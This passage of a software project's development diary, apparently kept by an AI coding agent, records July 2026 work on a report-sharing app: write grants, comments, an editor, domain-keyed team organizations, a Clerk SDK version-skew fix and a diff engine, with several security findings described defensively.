  ADR-0060 was scoped to extend it). The `/reports/{slug}/open` owner-token mint now gates on
  `ownerId === actor.userId`, not org membership — the security keystone ADR-0059 §4 called out
  (previously any org member could mint the 24h bypass-everything owner token). Review fix folded
  in: the report resource's `acl` block is owner-conditional (`packages/http/src/write-response.ts`),
  not blanket org-visible.
- **G2 + G3 — this PR (branch `feat/sharing-completion`, closes #139 and #140).** Combined per the
  operator's bigger-PRs directive (G2 ∥ G3 were independent after G1, but small enough to land
  together). **G2 (ADR-0056 P2):** the `org` unlock branch in `unlock.$slug.tsx` — Clerk session →
  resolve the mirrored identity → compare its org to the report's org → mint a mode-bound ~15-min
  access token, same shape as `password`; anon → `/sign-in?redirect_url=…`; non-member → a plain 403
  notice. **G3 (ADR-0060):** `report_write_grants` (migration `0012` — renumbered from `0011` after the parallel ADR-0065 epic took that slot on main, no enum) + `WriteGrantStore`
  port (Drizzle + in-memory + port-contract suite, mirroring `GrantStore`) + `grantWrite` /
  `revokeWrite` / `listWriteGrants` use cases (owner-only, `acl:write` scope) + the `canWrite`
  extension (`isOwner OR hasWriteGrant`, matched by `granteeUserId` OR the actor's normalized email
  via two new `IdentityStore` lookups, `findEmailByUserId` / `findUserIdByEmail`) at BOTH call sites
  (`load-owned.ts`'s `loadWritableReport` and `upload-report.ts`'s inline re-upload check — the two
  sites the G1 review flagged) + the single-report GET carve-out (`loadReadableReport`: org-visible
  OR write-grantee) + `POST`/`DELETE`/`GET /api/v1/reports/{slug}/write-grants[/{email}]` +
  `reports_grant_write` / `reports_revoke_write` / `reports_list_write_grants` MCP tools. Read-path
  actors now carry `scopes` too (`resolveActorForRead` widened, `SELF_SCOPES` exported from
  `provisionIdentity`) so `listWriteGrants` can enforce `acl:write` on a GET, matching its write
  siblings — a small, deliberate widening of the read-actor shape beyond what G1 left it at.
- **G4 — team organizations (#141)** remains scoping-first. Its hard gate (G1 deployed + backfilled
  before any multi-member org can exist) is satisfied; G2+G3 landing gives it something to be useful
  against, but the scoping work itself hasn't started.

Discovered, not fixed (pre-existing, unrelated): `docs/api/openapi.yaml` has one YAML syntax quirk
predating this PR (an unquoted plain scalar containing `: ` inside backticks on the `getReportAcl`
200 response description, around the original file's line 291) — `js-yaml` chokes on it, though the
repo's own `docs-conformance` check is token-presence lint, not a full parse, so it's gone unnoticed.
Flagging here per the "flag the contradiction, don't paper over it" rule; left alone as out of scope
for this PR.

### 2026-07-07 — ADR-0064 comments & annotations, slice 1: full vertical (domain → route)

The Authoring & Collaboration bounded context (ADR-0064) now exists end to end — `Comment`
aggregate → `CommentRepository` port + Drizzle/in-memory implementations → five use cases →
HTTP mappers → two Remix routes — built TDD, layer by layer. Docs (glossary, context-map,
events.md, `CLAUDE.md`'s four-context line) were already updated in an earlier docs-integration
wave; this slice made the code match them.

- **Domain** (`packages/domain/src`): `CommentId` (brand + `comment-id.ts` wire codec, prefix
  `comment_`, ADR-0052); `anchor.ts` — the `Anchor` value object (`{ versionPinned: { versionId,
  textQuote }, relative? }`); `comment.ts` — the aggregate (`createComment`/`replyToComment`/
  `resolveComment`, each returning a `CommentEmission` mirroring `report.ts`'s `Emission` pattern,
  named distinctly to avoid a barrel clash). Two JUDGMENT CALLS, both flagged inline: (1) body and
  anchor text-quote both capped at 2000 chars — ADR-0064 says "bounded... not a document" but gives
  no number; (2) `resolveComment` is idempotent (no-op + no duplicate event on an already-resolved
  comment), mirroring `applyScanResult`'s idempotent-absorb style rather than erroring.
- **Anchor shape**: v1 always populates `versionPinned` (a `ReportVersion` id + a text-quote
  snapshot); `relative` is an untyped, optional slot for a future Yjs-relative ProseMirror position
  (ADR-0062/0067) — deliberately NOT typed against `packages/report-html`, since the domain layer
  must stay dependency-free (ADR-024) and that package has no JS-facing position type yet. Whichever
  use case eventually resolves/writes a relative position casts at its own boundary.
- **Migration 0013** (`packages/db/drizzle/0013_comments.sql`, generated via `drizzle-kit generate`
  then renamed to a descriptive tag, matching 0010/0011's convention). Originally generated as `0012`
  against a pre-rebase schema; PR #150 (`feat/sharing-completion`, ownership epic G2+G3) merged to
  `main` mid-flight and claimed `0012` for `report_write_grants` — rebased onto it (`git fetch` +
  `git rebase origin/main`, stash/pop the uncommitted worktree, resolve schema.ts/journal.json/
  write-response.ts/diary.md conflicts by keeping both sides' additions) and regenerated as `0013`
  against the merged 17-table schema. `comments`
  table per ADR-0064 §5. **JUDGMENT CALL, flagged in the migration + `docs/db-design.md`**: the
  self-FK `parent_comment_id → comments` is `ON DELETE CASCADE`, not the schema's stated RESTRICT
  default — a thread's replies are owned by its root the same way `report_versions` are owned by
  their `report`, so deleting a root comment deletes its replies rather than leaving them
  FK-orphaned. Verified against REAL Postgres (pglite) in the adapter contract test, not just
  asserted in the in-memory fake.
- **Ports + repos**: `CommentRepository` (`findById`/`save`/`listByReport`/`delete`) in
  `packages/application/src/ports.ts`; `InMemoryCommentRepository` + `DrizzleCommentRepository`;
  the shared contract suite (`describeCommentRepositoryContract`, mirroring the Folder/Report
  pattern) runs against both (ADR-0046 two-tier testing) — 8 shared assertions each, including the
  cascade-delete-on-root case above. `IdGenerator` gained `commentId()` (port + `UuidV7IdGenerator`
  + the `SequentialIdGenerator` test fake).
- **Use cases**: `addComment`/`replyToComment` are gated by `canWrite` via the existing
  `loadWritableReport` seam (ADR-0064 §3: "the SAME way report writes are") — **NOT**
  `loadOwnedReport`, which this codebase reserves permanently for delete/setAcl/grant-management
  (ADR-0059 §2). Written initially against the pre-rebase world where `canWrite = isOwner` only;
  after rebasing onto PR #150, `canWrite` is `isOwner OR hasWriteGrant` for real (`WriteGrantStore` +
  `IdentityStore.findEmailByUserId`, ADR-0060 §4) — updated both use cases to thread the now-required
  `WriteGrantCheckDeps` through, so a cross-org write-grantee can genuinely author a comment on a
  report they can write to, not just the owner. `resolveComment`/`deleteComment` enforce a DIFFERENT
  rule (comment author OR report owner) — that part is unchanged by the rebase — but their EXISTENCE/
  visibility gate moved from `loadOrgReport` (org-scoped only) to `loadReadableReport` (owner OR
  org-visible OR write-grantee): since a comment's author can now legitimately be a cross-org
  grantee, the base gate must let that same author back in to resolve/delete their OWN comment
  outside the report's org — `loadOrgReport` would have wrongly 403'd them. Verified with a
  dedicated test in each use case (grant a cross-org user write access, have them author a comment,
  then resolve/delete it as that same user under a different org context). `listComments` still
  mirrors `listReportVersions`'s CURRENT behavior (org-scoped `loadOrgReport`) — flagged as a KNOWN
  GAP, not fixed: `getReport` gained the grantee carve-out in PR #150 but `listReportVersions` did
  not, so `listComments` inherits the same parity gap by design (mirroring a sibling endpoint, not
  `getReport` itself). `CommentAdded`/`CommentResolved` flow through the same `UnitOfWork`+
  `EventOutbox` transaction shape `processScanResult` uses; `deleteComment` needs neither (no domain
  event on delete).
  **Audit rows were NOT added** — despite ADR-0059/0060/0056 all saying "matches the existing
  every-mutation-audited pattern," grepping the codebase found NO use case anywhere writes
  `audit_log` yet (the table exists; `AuditLogger` is a documented-but-unwired aspirational
  consumer on every event in `docs/events.md`, matching this one). Following the actual codebase,
  not the aspirational doc line — flagged rather than inventing a one-off pattern for this slice
  alone.
- **HTTP**: `commentBody` (resource.ts) — `object: "comment"`, `parent_id` null for a root;
  `addCommentToHttp`/`resolveCommentToHttp`/`deleteCommentToHttp` (write-response.ts),
  `listCommentsToHttp` (list-response.ts).
- **Routes**: `GET`/`POST /api/v1/reports/{slug}/comments` (list + create-or-reply — POST branches
  on `parent_comment_id` in the body, same "one route, body-shape dispatch" idiom the ACL route
  already uses) and `PATCH`/`DELETE /api/v1/reports/{slug}/comments/{comment_id}` (resolve / delete).
  **JUDGMENT CALL, flagged in the route file**: ADR-0064 §7 lists "get/update/resolve/delete"
  without pinning verbs; PATCH carries resolve (mirrors `api.v1.reports.$slug.ts`'s "PATCH = mutate
  a field in place") since there's exactly one transition today and no un-resolve. A standalone GET
  for one comment and a general field-editing PATCH were NOT built — out of scope for this slice.
  MCP tools deferred entirely, per the task brief (kept the surface tight).
  `openapi.yaml` gained the `Comments` tag, both paths, and the `Comment`/`CommentList`/`Anchor`/
  `CreateCommentRequest` schemas.
- **e2e**: `tests/e2e/features/comment-on-a-report.feature` (`@phase-2 @wip`, matching
  `list-report-versions.feature`'s already-implemented-but-not-yet-playwright-wired precedent) —
  create+reply+list+resolve happy path, single-level-threading rejection, unauthenticated 401,
  cross-org 403, author-or-owner moderation, and "never surfaces on the public viewer." Registered
  in `scripts/docs-conformance/config.mjs`'s feature catalog. `docs/events.md`/
  `docs/domain-glossary.md`/`docs/context-map.md` already carried `Comment`/`Anchor`/`Thread`/
  `CommentAdded`/`CommentResolved` from an earlier docs-integration wave — verified they match what
  actually got built, no corrections needed. `README.md`'s feature-file count corrected 29 → 31
  (it was already one stale before this slice — a pre-existing, unrelated drift, fixed in passing).
- **Untouched, as scoped**: `apps/view` (no viewer changes — comments stay app-origin-only per
  ADR-0064 §4), the editor slice's areas (upload path, `r2-blob-store`, `packages/report-html`),
  `docs/mcp-usage.md`, every migration number except `0013`.
- **Gate** (final, post-rebase onto PR #150): `pnpm install` clean; `biome ci .` clean;
  `turbo typecheck` (12 packages) clean; `vitest run` — 757 tests / 118 files green (the full
  monorepo suite, PR #150's own `WriteGrantStore` contract suites included; this slice adds the two
  new pglite comment contract suites, 9 `arp-http` tests, and the grantee-authorization tests added
  during the auth-seam rebase fix); `npm run docs:check` clean.

Worktree: `worktree/comments` (branch `feat/comments`). Not yet merged.

### 2026-07-07 — ADR-0062 editor MVP: sidecar write path + saveEditedVersion + in-dashboard editor

Built on top of the merged ADR-0062–0067 doc wave and `arp-report-html` (PR #148): the first working
slice of the in-app editor. Scope was deliberately vertical — write path, one new use case, one route,
one entry point — not the full suggestion/diff/co-editing roadmap those later ADRs cover.

- **Sidecar write path (`packages/application/src/use-cases/upload-report.ts`)**: extended
  `UploadCommand` with optional `origin?: VersionOrigin` and `sourceDoc?: Record<string, unknown>`
  (deliberately NOT a `PMDocJson` import from `arp-report-html` — the application layer stays free of
  the ProseMirror dependency, ADR-024). When `sourceDoc` is set, a `_source.json` blob is appended to
  what's WRITTEN to R2 (`filesToWrite`) but never touches `manifestOf(bundle)`, which is built from
  `bundle.files` alone — the manifest is the allowlist the (future) asset-serving surface would honor,
  and the sidecar must never appear in it. Security-critical test:
  `upload-report.test.ts` → `"SECURITY: an editor save's _source.json sidecar reaches the blob store
  but is excluded from the version manifest…"` — asserts both halves (`blobs.readObject` finds it;
  `manifest.files` doesn't list it) in one test. A research pass over `apps/view` confirmed the viewer
  today only ever serves one hardcoded path (`manifest.entryDocument`) — no route accepts an arbitrary
  sub-path yet — so this is currently belt-and-braces against a *future* asset route, not a live hole;
  still required by ADR-0062 §4 and worth having in place before that route exists.
- **`saveEditedVersion` (new use case, `save-edited-version.ts`)**: a thin wrapper over `uploadReport`
  rather than a second pipeline — ADR-0062 §5 is explicit that edit-save reuses the ADR-0037 pipeline
  verbatim, and `uploadReport`'s `reUpload` branch already has everything needed (R2-first/commit-last,
  idempotency, scan enqueue, the `canWrite` ownership gate). `saveEditedVersion` always drives
  `uploadReport` via `updateSlug` (there is no create path — an editor session always opens an existing
  report first) with `origin: "editor"`. **Idempotency key**: left as `uploadReport`'s existing derived
  key (`hash(user ∥ route ∥ content_hash ∥ target)`) unchanged, since this wrapper calls the same
  function — meaning an editor-save and a plain re-upload of byte-identical content to the same slug
  share one idempotency namespace. Judgment call, documented in the wrapper's doc comment: correct
  today (double-submitting Save dedupes, which is what you want), flagged in case editor-saves and API
  uploads ever need independent namespaces.
- **Editor route (`apps/app/app/routes/reports.$slug.edit.tsx`)**: loader opens the live-or-newest
  version, reads `_source.json` when present (lossless reopen) else best-effort `parseBody`s the split
  body HTML; the POST action re-reads the report fresh (not the loader's snapshot), re-derives the
  shell from the CURRENT editable version's HTML, serializes the posted PM doc via `serializeBody`,
  `reinjectShell`s it back into a whole document, and calls `saveEditedVersion`. Auth on both loader and
  action is `loadWritableReport` — the same `canWrite` gate `uploadReport`'s `reUpload` branch uses —
  mirroring re-upload's authorization exactly, per the slice brief (the brief's literal
  `loadOwnedReport` reference was the owner-only delete/setAcl seam; the one that actually matches
  re-upload's behavior is `loadWritableReport`, so that's what both the loader and action use).
- **Client-only ProseMirror editor**: `apps/app/app/editor/editor-state.ts` (pure — no DOM;
  `createEditorState`/`docJson`/`editorPlugins`, no toolbar per MVP scope — Mod-b/Mod-i/undo-redo +
  ProseMirror's `baseKeymap`) and `apps/app/app/components/ReportEditor.tsx` (the `useEffect`-mounted
  `EditorView`, since Remix SSR must never construct a real DOM). New `apps/app` deps:
  `prosemirror-view`/`-state`/`-keymap`/`-commands`/`-history` + `arp-report-html` (workspace).
  `vitest.config.ts` gained one more scoped include, `apps/app/app/editor/**/*.test.ts` — same
  rationale as the existing `apps/app/app/server` carve-out (root config's own comment): ProseMirror's
  state/transform layer needs no DOM, so it's cheap to unit-test even though the rest of the Remix UI
  stays e2e-only (the mounted `EditorView` itself is NOT unit-tested — deferred to Playwright).
- **Entry point**: an Edit (pencil) icon-link next to each dashboard row's existing Open link
  (`_index.tsx`), routing to `/reports/:slug/edit`; owner-gating happens in the route itself, so a
  non-owner following a stale link is redirected home exactly like `/open`.
- **e2e**: `tests/e2e/features/edit-report-in-dashboard.feature` (`@phase-2`, `status: "full"` in
  `scripts/docs-conformance/config.mjs`) — happy path (open → edit → save → origin "editor" in both the
  version and `GET .../versions`), the sidecar-never-public property, and the unauthenticated-save /
  non-owner-open denials. No Bruno/openapi change: the save flow is an internal Remix action on
  `apps/app`, not a new `/api/v1` route (stated explicitly against the ADR-026 doc-trigger matrix).
  README's `.feature` file count bumped 29 → 30.
- **Not touched, on purpose**: `apps/view`, comments code, `packages/db` migrations (none needed — the
  sidecar is a same-prefix R2 object, ADR-0062 §4), the viewer CSP.
- **Gate**: `biome ci .` clean (one pre-existing warning in the report-html fixture, unrelated),
  `turbo typecheck` (12 packages) clean, `vitest run` — 103 files / 632 tests green (up from 101/623
  pre-slice), `docs:check` clean.

Worktree: `worktree/editor-mvp` (branch `feat/editor-mvp`). Not yet merged.

### 2026-07-08 — ADR-0068: the G4 scope decisions (domain-keyed single-org membership)

The G4 scoping PRD (#141) put six deferred decisions to the operator; all six answered and
recorded as **ADR-0068** (resolves + amends ADR-0061): **(1)** one user = one org, keyed by email
domain — corporate domains form multi-member team orgs JIT (every same-domain sign-up joins),
public-provider addresses keep 1:1 personal orgs; the org-mode unlock's active-org check becomes
correct by construction (no Clerk membership calls); multi-org membership is revisit-later.
**(2)** Clerk custom-roles infrastructure with only admin/member defined. **(3)** team-org creation
is JIT at first sign-up (extends ADR-0048) — no invitation UI, no self-serve creation. **(4)**
ownership transfer DEFERRED — the ADR-0059/0061 launch prerequisite is explicitly waived; accepted
risk: a departed member's reports go read-only until it ships. **(5)** org-mode share UX stays
API/MCP-only (fast-follow). **(6)** the two-member e2e fixture is hand-provisioned
(silver+clerk_test@agranado.com on the dev Clerk instance — an accepted ADR-017 exception,
reconstruction steps owed in the e2e docs). Worktree `docs/adr-0068-g4-scope-decisions`. The G4
build follows ADR-0068's build order: provisioning (domain rule + public-provider list) →
membership mirroring → fixture-backed e2e → share UX / transfer as later slices.

### 2026-07-08 — Editor comment UI (dashboard sidebar) + the viewer edit deep-link (ADR-0063 Decision 3 fallback)

Two independent slices landed together in one worktree: (1) a comment sidebar
in the in-dashboard editor, consuming the ADR-0064 comments vertical shipped
in PR #152 without touching its contracts, and (2) `GET /<slug>/edit` on
`apps/view` — the documented dashboard-origin fallback from ADR-0063 Decision
3, shipped now as the INTERIM answer while the full in-viewer editing route
stays gated on its `/security-review` pass.

- **Anchor capture** (`apps/app/app/editor/anchor.ts`): `buildSelectionAnchor`
  turns the editor's current selection (`from`/`to`/`text` + the open
  `versionId`) into an ADR-0064 §2a Anchor payload — always the version-pinned
  fallback, plus an optional `relative` `{from,to}` slot. JUDGMENT CALL,
  flagged inline: `relative` here is a plain PM-position pair against the
  CURRENTLY-OPEN doc, NOT yet edit-stable or Yjs-relative (ADR-0067's shape
  doesn't exist yet) — the domain's `relative` slot is `unknown` specifically
  so a v1 caller can populate it this way and a later collaboration layer can
  replace it without a domain change.
- **Highlight decorations** (`apps/app/app/editor/comment-decorations.ts`):
  `resolvableCommentRanges` (pure, unit-tested for in/out-of-bounds/malformed
  cases) plus a ProseMirror `commentHighlightsPlugin` — seeded via
  `tr.setMeta(commentHighlightsKey, ranges)` whenever the comments list
  changes; an ordinary typing transaction carries no such meta, so the
  existing `DecorationSet` re-maps itself through ProseMirror's own position
  mapping instead. Best-effort per ADR-0064 §2a: an edit that pushes a range
  out of bounds just stops highlighting it — the comment stays listed,
  version-pinned. Wired into `editorPlugins()` and `ReportEditor.tsx` (new
  `comments`/`onSelectionChange` props, a `viewRef` to dispatch decoration
  updates from a `comments`-keyed effect independent of the mount effect).
- **Sidebar + wiring**: `reports.$slug.edit.tsx`'s loader now also exposes
  `versionId` (wire-encoded, previously absent — needed to anchor a NEW
  comment) and `comments` (server-side `listComments` call, per the task
  brief's "not a client HTTP self-call" instruction — best-effort: a
  `listComments` failure never blocks opening the editor, just shows an empty
  sidebar). Author email is enriched via `IdentityStore.findEmailByUserId`,
  one lookup per unique author. Mutations (add/reply/resolve — NOT delete,
  see below) go through a new co-located resource route,
  `reports.$slug.comments.ts`, a thin wrapper over the SAME
  `addComment`/`replyToComment`/`resolveComment` use cases the `/api/v1`
  comments routes call — no new authorization rule. Its request-body guard
  (`parseCommentIntent`, `apps/app/app/server/comment-intent.server.ts`) and
  its Comment→client DTO mapping (`commentToDto`,
  `apps/app/app/server/comment-dto.server.ts`) are both pure and unit-tested,
  mirroring the `apps/app/app/server` carve-out's existing rationale
  (`handle.server.ts`/`http.server.ts`). The resource route reuses the edit
  route's `rejectNonJsonContentType` JSON-only guard (same CSRF rationale).
  `CommentSidebar.tsx` renders Threads (root + single-level replies), an
  inline composer that only appears while there's a non-empty selection, a
  reply box per thread, and a Resolve button — Forge & Ember tokens
  (Badge/Button/Card/Textarea), no new styling primitives.
  **JUDGMENT CALL**: `deleteComment` is NOT wired into the sidebar — the task
  brief's scope is explicitly add/reply/resolve; the use case and its
  `/api/v1` route already exist for a future moderation surface.
  **JUDGMENT CALL**: no "load more" pagination — the loader requests the
  first 100 comments (`list-comments.ts`'s `MAX_LIMIT`) and stops there.
  Remix's default fetcher-triggers-revalidation behavior refreshes the edit
  route's loader (and therefore the sidebar + highlights) after every
  add/reply/resolve, with no manual refetch code.
- **Tests**: `anchor.test.ts`, `comment-decorations.test.ts` (pure range
  resolution + the plugin's decoration-set/re-mapping behavior),
  `comment-intent.server.test.ts`, `comment-dto.server.test.ts` — all
  headless, matching the repo's "UI mounting stays e2e territory" convention
  (`ReportEditor.tsx`/`CommentSidebar.tsx` themselves are not unit-tested).
  `comment-on-a-report.feature` gained one `@wip`-tagged UI scenario
  (add/reply/resolve/highlight from the sidebar) alongside its existing
  API-level scenarios.
- **Viewer deep-link** (`apps/view/app/routes/$slug.edit.tsx`): a pure,
  unauthenticated 302 to `{APP_ORIGIN}/reports/{slug}/edit` — no JS, no HTML
  body, no session concept added to `view.<domain>`. Fails closed (503) when
  `APP_ORIGIN` is unset rather than guessing at a same-origin fallback; a
  malformed slug is 404'd (shape-validated via `makeSlug` before it ever
  reaches a `Location` header — not an auth check, there is none here, just
  refusing to build a redirect URL from an arbitrary path segment). Verified
  before writing this: `apps/view/app/routes/` has no catch-all route today
  (`_index.tsx`, `$slug.tsx`, `health.tsx` only), so `/<slug>/edit` collides
  with nothing — the task brief's assumption held. Does NOT touch `$slug.tsx`
  (untouched, byte-for-byte) or its header tests. The pure URL-building step
  (`buildEditRedirectLocation`, `apps/view/app/server/edit-redirect.ts`) is
  unit-tested — a new carve-out added to `vitest.config.ts`
  (`apps/view/app/server/**/*.test.ts`), mirroring the `apps/app/app/server`/
  `apps/app/app/editor` precedent; `apps/view` otherwise still has NO
  unit-test tier (its Remix routes stay e2e-only, matching `$slug.tsx`/
  `health.tsx` today). e2e: a new `view-edit-deep-link.feature`
  (`@phase-2 @wip`, registered in `scripts/docs-conformance/config.mjs`) —
  Playwright isn't wired for either viewer-app route today, same as the rest
  of the `@wip` catalog. `docs/api/openapi.yaml` gained a `/{slug}/edit` entry
  under the existing `Viewer` tag (which already documents `/{slug}` "for
  contract completeness") — no Bruno regen (no `/api/v1` route added; no
  `.bru` files exist in this repo at all yet, confirmed before skipping this).
  README's `.feature` file count corrected 32 → 34 (33 pre-existing on disk,
  one 34th added here — the count was already one stale before this slice,
  same drift pattern noted in the 2026-07-07 comments entry, fixed in
  passing).
- **Untouched, as scoped**: `packages/domain`, the comment use
  cases/repository/HTTP mappers/`/api/v1` routes (consumed, not modified), any
  migration, `docs/events.md` (no new event), `apps/view/app/routes/$slug.tsx`
  and its header stack.
- **Gate**: `pnpm install` clean; `biome ci .` clean (the one pre-existing
  `noDescendingSpecificity` warning in the report-html fixture, unrelated,
  same as noted 2026-07-07); `turbo typecheck` (12 packages) clean;
  `vitest run` — 126 files / 824 tests green; `npm run docs:check` clean.

Worktree: `worktree/comment-ui` (branch `feat/comment-ui`). Not yet merged.

### 2026-07-08 — G4 build: domain-keyed team orgs (ADR-0068, issue #141, epic #142)

Implemented ADR-0068's build order in one PR (TDD throughout):

- **§1 domain rule**: `packages/domain/src/org-key.ts` — `resolveOrgKey(email)`, a pure Value
  Object. An explicit `PUBLIC_PROVIDER_DOMAINS` set (gmail/googlemail/outlook/hotmail/live/yahoo/
  icloud/me/proton.me/protonmail/aol/gmx) → `personal` org keyed by the full normalized address;
  every other domain → `team` org keyed by the domain. Exact whole-domain matching only — no
  substring/suffix — so `notgmail.com` and an unlisted public-provider subdomain (e.g.
  `mail.yahoo.co.jp`) are both their own `team` domains, and a two-level-TLD domain (`acme.co.uk`)
  is keyed by the FULL string, not an eTLD+1 guess. 19 unit tests including the boundary cases.
- **§2 `orgs.kind` migration**: new `org_kind` enum (`personal`|`team`) + `orgs.kind NOT NULL
  DEFAULT 'personal'`, migration `0014` (0013 was already claimed by the comments epic on
  `origin/main` by the time this PR branched). Default keeps every existing org behavior-neutral.
- **§3 JIT join-or-create provisioning**: `ClerkOrgProvisioner` (adapters) grows
  `findTeamOrgByDomain` / `createTeamOrg` / `ensureMembership` — the port speaks in plain email
  domains; the adapter derives a Clerk-safe slug internally (dots → hyphens) so a domain like
  `housenumbers.io` always resolves to the same Clerk org via `getOrganization({slug})`.
  `ensureMembership` is idempotent (membership-list check-then-act, plus a 422-from-Clerk fallback
  for the rare concurrent double-join). `IdentityStore.createPersonalIdentity` is renamed to
  `createIdentity` and takes an explicit `kind: OrgKind` — its org upsert was ALREADY a
  find-or-create keyed on `clerk_org_id` (existing row wins on conflict), so a second colleague
  joining a domain's team org mirrors a distinct `User` under the SAME `Org` + Root folder with no
  change to that mechanic, just the added `kind` on first creation. `provisionIdentity` derives the
  org key up front and branches: an already-active session org is trusted as-is (one-user-one-org
  invariant); otherwise personal keeps the unchanged `createPersonalOrg` path, team finds-or-joins
  the domain org. All 825 workspace tests green after the change (pglite integration covers a
  second colleague joining the same team org: same `Org`/root folder, distinct `User`).
- **§4 membership mirroring — evaluated, deliberately NOT wired**: this store has no local
  membership join table (`users`/`orgs` are independent mirror rows); every authorization gate
  that matters (`orgUnlock`, JIT provisioning) checks Clerk's LIVE session/API, not a cache. Wiring
  `organizationMembership.deleted` also wouldn't durably remove a member anyway — under
  domain-keyed JIT join-or-create, a removed member who signs in again silently re-derives and
  rejoins the SAME team org (an ADR-0068-accepted trade-off) — persistent removal needs a
  "don't-auto-rejoin" mechanism this epic doesn't build. Documented inline in `webhooks.clerk.ts`
  rather than shipping a placebo handler; `user.deleted` (ADR-0054) is unchanged.
- **Copy fix**: `orgMembershipNotice` in `unlock.$slug.tsx` no longer says "switch your active
  organization and retry" — there is no switching under one-org-per-user.
- **§6 fixture-backed e2e**: `tests/e2e/support/clerk-session.ts` grows `mintTestSessionFor`/
  `mintSecondTestSession` for the hand-provisioned `silver+clerk_test@agranado.com` (a Clerk
  `+clerk_test` test-mode address, code `424242`; domain `agranado.com` is off the public-provider
  list → a `team` org). New `tests/e2e/smoke/team-org-upload.feature(.steps.ts)` — signs in as the
  second identity and uploads, exercising the team-org join-or-create branch against REAL Clerk +
  infra (first live verification of ADR-0068 §3 beyond unit/adapter tests); wired into the existing
  `@auth` gate, no new CI secrets. `tests/e2e/README.md` (new) documents both fixtures'
  identifiers/expected-org/reconstruction steps (the accepted ADR-017 exception). The two
  `@phase-2 @wip` scenarios in `sharing-modes.feature`/`report-write-grants.feature` stay `@wip`:
  the second identity existing is necessary but not sufficient — discovered that NEITHER file has
  any step definitions at all, and `playwright.config.ts`'s `testDir` doesn't collect
  `tests/e2e/features/**` yet (a pre-existing gap predating this PR, visible in that file's own
  comments and `.github/workflows/e2e.yml`'s). Noted precisely inline rather than faking coverage;
  authoring the full step-definition layer for the product `.feature` files is separate, sizeable
  follow-up work.
- **Docs**: `docs/db-design.md`'s `org_kind`/`kind` rows updated to point at migration `0014` and
  ADR-0068's derivation-at-provisioning framing (the glossary was already updated by ADR-0068
  itself and needed no further change).

Worktree: `worktree/team-orgs` (branch `feat/team-orgs`). Not yet merged.

**Review wave (same day, pre-merge):** the dual review (claude-review bot + local two-agent pass)
caught one **critical** — the team-org slug's bare dot→hyphen mapping is not injective, and with
JIT auto-join a slug collision is a tenant-boundary crossing (registrable `acme-co.uk` vs
`acme.co.uk`). Fixed: hash-suffixed slugs + a fail-closed `publicMetadata.domain` anchor check
before any join. Also from review: create-race recovery (two first sign-ups at a new domain no
longer 500 the loser), `ensureMembership` matches Clerk's already-a-member error by CODE (a bare
422 swallow also covered quota-exceeded), OAuth provisioning uses verified emails only (the email
domain IS the tenancy boundary), the public-provider list grew 12 → ~90 domains (a missed provider
= a shared team org for strangers), FQDN trailing-dot normalization, and a real hard-DELETE FK
cascade test. Implementation resolutions recorded in ADR-0068's More-information block (webhook
drop, sticky orgs, cutover semantics). Operator to-dos at merge: delete the stale `agranado-com`
dev-Clerk org (slug scheme changed); run the one-query prod check for pre-existing corporate-domain
users; confirm the Clerk instances block unverified sign-ins (ADR-0068 hard dependency).

**Preview-down addendum (same day):** after merging main back in, the PR's preview 500'd on every
route — `SyntaxError: The requested module '@clerk/backend/errors' does not provide an export named
'isClerkAPIResponseError'` at module load. Root cause: a two-major version skew. `packages/adapters`
declared `@clerk/backend@^3.7.1` (whose `/errors` subpath exports the guard), but on Vercel the
adapter is bundled into `apps/app`'s server build and the externalized `@clerk/backend` import
resolves from `apps/app`'s node_modules → `2.33.5` (pinned alongside `@clerk/remix@4.x`), whose
`/errors` subpath exports NO guard — so the import crashed every route, while unit tests (resolving
the adapter's own 3.7.1) stayed green. Fix: a local STRUCTURAL guard (`clerkError === true` +
`status` + `errors[]` — the shape both majors stamp on instances via `@clerk/shared`), no
`@clerk/backend/errors` import at all, and `packages/adapters` re-pinned to `^2.33.0` so
typecheck/tests exercise the same major production runs. Lesson recorded: `instanceof`-based SDK
guards are unsafe in this monorepo whenever two copies of the SDK can coexist in one process.

### 2026-07-08 — Version history UI + visual diff (ADR-0065 §3/§4)

Built the dashboard-facing half of ADR-0065: a version-history page and a visual diff between two
versions, on top of the already-shipped `/api/v1/reports/{slug}/versions` endpoint (PR #144-adjacent
work) and the ADR-0062 `_source.json` sidecar.

- **Diff engine (`packages/report-html`, framework-free — no React/Remix, only prosemirror-\*)**:
  - `diffDocs(oldDoc, newDoc): DocDiff` (`diff.ts`) — diffs two `PMDocJson`s by building a single
    `Transform` that replaces the whole of `oldDoc`'s content with `newDoc`'s, then handing its step
    maps to **`prosemirror-changeset`** (new dep, this package only, per ADR-0065's sanctioning) via
    `ChangeSet.create(oldDoc).addSteps(tr.doc, tr.mapping.maps, null)`. The library re-diffs the
    replaced range internally down to character-level spans; `simplifyChanges` then expands those to
    word boundaries (confirmed against the fixture: a raw `"jum"→"lea"` stem overlap becomes the clean
    whole-word `"jumps"→"leaps"`). Verified on the real `ai-readiness-report.html` fixture (1045 lines):
    editing one `.desc` paragraph produces exactly the changed spans, with the shared
    `"Tokenization"`/`"context-window economics"` prefix correctly recognized as unchanged.
  - `diffRendered(oldDoc, newDoc): string` (`diff.ts`) — renders the merged body HTML with
    `<span class="rd-diff-ins">`/`<span class="rd-diff-del">` markers (classes, never bare
    `<ins>`/`<del>`, per the brief). Mechanism: re-parse `newDoc` into `diffSchema` (`diff-schema.ts` —
    `reportSchema` plus two transient inline marks, `diffIns`/`diffDel`, never persisted), then apply the
    change ranges as `addMark`/`insert` on a `Transform`, highest position first (right-to-left) so
    earlier positions in the same pass stay valid. Deletions have no position in the new doc
    (`toB === fromB`), so the deleted text is inserted as its own `diffDel`-marked run immediately before
    the insertion point — the spike's `Decoration.widget` idea, reimplemented without needing
    `prosemirror-view`/`-state` at all (avoided on purpose — those are UI-layer deps; the whole engine
    stays framework-free using only `prosemirror-model`/`-transform`/`-changeset`, all serialized through
    the same jsdom `DOMSerializer` `parseBody`/`serializeBody` already use). Accepted ADR-0065 limitation
    reproduced and tested: a change spanning a paragraph boundary collapses the deleted text into one
    run.
  - `diffHtmlFallback(oldHtml, newHtml): HtmlFallbackDiff` (`html-fallback.ts`) — best-effort, block-level
    diff (split on `><` tag adjacency, classic O(n·m) LCS) for when either side lacks a sidecar. **Security
    finding, fixed before writing any UI**: this fallback's INPUT is raw, unsanitized, possibly-hostile
    uploaded HTML — the reason it's a fallback at all is that content never went through `reportSchema`'s
    parse (the sanitizing boundary `security.test.ts` enforces for `diffDocs`/`diffRendered`). An
    HTML-passthrough fallback would have been a live app-origin XSS route, directly contradicting
